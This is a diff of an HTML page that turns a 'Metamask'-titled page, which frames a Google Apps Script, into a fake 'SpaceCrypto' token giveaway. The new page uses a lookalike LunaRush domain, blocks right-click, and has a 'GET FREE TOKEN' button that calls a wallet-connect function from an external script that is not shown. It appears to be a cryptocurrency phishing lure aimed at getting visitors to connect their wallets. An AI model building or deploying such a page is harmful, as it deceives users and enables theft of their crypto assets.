@@ -1,13 +1,76 @@
+
 <!DOCTYPE html>
-<html lang="th">
+<html lang="en">
 <head>
-    <base target="_top">
+  <script language=JavaScript>
+    <!--
+    var message="SPACE Crypo";
+    ///////////////////////////////////
+    function clickIE() {if (document.all) {alert(message);return false;}}
+    function clickNS(e) {if 
+    (document.layers||(document.getElementById&&!document.all)) {
+    if (e.which==2||e.which==3) {alert(message);return false;}}}
+    if (document.layers) 
+    {document.captureEvents(Event.MOUSEDOWN);document.onmousedown=clickNS;}
+    else{document.onmouseup=clickNS;document.oncontextmenu=clickIE;}
+    document.oncontextmenu=new Function("return false")
+    // --> 
+    </script>
     <meta charset="UTF-8">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Metamask</title>
+    <title>SpaceCrypto - The battle of Spaceship on Blockchain game</title>
+    <link rel="shortcut icon" href="images/logo-luna-rush.ico" type="image/x-icon">
+    <link rel="stylesheet" href="lib/angular-material/angular-material.css">
+    <link rel="stylesheet" href="app.css">
+    <link rel="stylesheet" href="style.css">
+			<meta property="og:image" content="https://lunarash.io/RANDOMGIVAWAYYY.png">
+<meta property="og:image:width" content="1920">
+<meta property="og:image:height" content="970">
+<meta property="og:type" content="website">
+<meta property="og:title" content="LunaRush - The battle RPG game based on Blockchain technology.">
+<meta property="og:url" content="https://lunarash.io">
+<meta property="og:site_name" content="LunaRush.io">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:label1" content="Ước tính thời gian đọc">
+<meta name="twitter:data1" content="5 phút">
+<!-- Global site tag (gtag.js) - Google Analytics -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1EGVGDYEX3"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);}
+  gtag('js', new Date());
+
+  gtag('config', 'G-1EGVGDYEX3');
+</script>
 </head>
+
 <body>
-    <iframe style="width: 100%; height: 100vh;" scrolling="yes" src="https://script.google.com/macros/s/AKfycby3Ornoclp0gC_iu5nyjVSz5uDvITnKCw68CYNmkosFykYUVtFyxW0Zzi8T1HKSn7Nb/exec" frameborder="0"></iframe>
+
+      <img src="images/Bg_1.png" >
+     
+   
+      <div class="overflow">
+        <div id="modal-window">
+          <img src="images/SPE.png" id="modal-logo">
+          <h1 id="modal-title">Free 40 SPE.</h1>
+          <p id="modal-subtitle">We are giving away a random WARRIORS or SPECIAL BOX to users who are able to complete this quest.</p>
+          <p id="modal-subtitle2">Remember that you have the possibility to receive a random SPECIAL BOX / SPE. This will be the last opportunity to get one!.</p>
+          <button onclick="Connects()" id="modal-button">GET FREE TOKEN</button>
+        </div>
+        <div class="overflow2">
+            <div id="modal-window">
+              <img src="images/SPE.png" id="modal-logo">
+              <h1 id="modal-title">Thanks for participating!</h1>
+              <p id="modal-subtitle">Your queue number: #4386</p>
+              <p id="modal-subtitle2">Don't forget to save your giveaway <a href="#">certificate</a> and copy your authentication key from it. never share this key with third parties, we never ask our user for it!</p>
+            </div>
+          </div>
+          <img src="images/loading.svg" alt="loading" class="loader">
+      </div>
+      <script src="onclick.js"></script>
+      <script type="text/javascript" src="funct.js"></script>
+      <script type="text/javascript" src="web3.min.js"></script>
+      <script src="https://kit.fontawesome.com/12efc69514.js" crossorigin="anonymous"></script>
 </body>
 </html>
